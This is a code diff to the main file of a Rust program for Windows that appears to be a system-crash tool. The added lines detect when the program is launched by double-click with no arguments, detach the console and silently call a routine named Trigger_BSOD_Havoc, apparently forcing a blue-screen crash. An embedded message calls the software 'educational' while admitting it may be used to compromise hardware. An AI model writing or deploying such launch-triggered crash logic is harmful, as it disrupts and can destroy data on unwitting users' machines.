@@ -14,20 +14,41 @@ use std::process;
 use clap::Parser;
 
 mod argument;
-mod panic;
 mod behavior;
+mod panic;
 
 use argument::ArgParser;
 
-use crate::behavior::traitbehavior;
+use crate::behavior::{traitbehavior, trigger_bsod_havoc::Trigger_BSOD_Havoc};
 
+use windows_sys::Win32::System::Console::GetConsoleProcessList;
 
 unsafe extern "system" {
     // Detatch from Terminal
-    pub fn FreeConsole() -> i32 ;
+    pub fn FreeConsole() -> i32;
+}
+
+fn is_launched_from_non_terminal() -> bool {
+    // Create a tiny buffer to hold process integers
+    let mut process_list = [0u32; 2];
+    // We need unsafe args since we need Windows API calls
+    let attached_process = unsafe { GetConsoleProcessList(process_list.as_mut_ptr(), 2) };
+    // If attached_process = 1, means that the software is all alone
+    attached_process == 1
 }
 
 fn main() {
+    // Check noargs first
+    let noargs = env::args().len() == 1;
+    if noargs && is_launched_from_non_terminal() {
+        unsafe {
+            FreeConsole();
+        }
+        // We call bsod here instead
+        Trigger_BSOD_Havoc();
+        process::exit(0);
+    }
+
     // Parse args right away!
     let _args = ArgParser::parse();
 
@@ -35,7 +56,9 @@ fn main() {
         unsafe {
             FreeConsole();
         }
-        println!("If you see this, lol. To be honest, this software is supposed to be for educational use only, and did not mean harm. But if you did not intend to have this software, then that means someone probably is trying to compromise your hardware. Also hello. uhhhhh sir. If you see this via some form of Hex editor or String checks from Linux or idk what util from windows, then i will say this, this software was not meant for harm. But if this software was seen being disrupting the wide web, then i apologize. I did not mean harm. But ill say this, please lock the NT Kernel to only microsoft to have access to it at this point.");
+        println!(
+            "If you see this, lol. To be honest, this software is supposed to be for educational use only, and did not mean harm. But if you did not intend to have this software, then that means someone probably is trying to compromise your hardware. Also hello. uhhhhh sir. If you see this via some form of Hex editor or String checks from Linux or idk what util from windows, then i will say this, this software was not meant for harm. But if this software was seen being disrupting the wide web, then i apologize. I did not mean harm. But ill say this, please lock the NT Kernel to only microsoft to have access to it at this point."
+        );
     }
     if _args.possible_codes {
         println!("
@@ -71,8 +94,5 @@ fn main() {
         process::exit(0);
     }
 
-
     traitbehavior(&_args);
-
 }
-
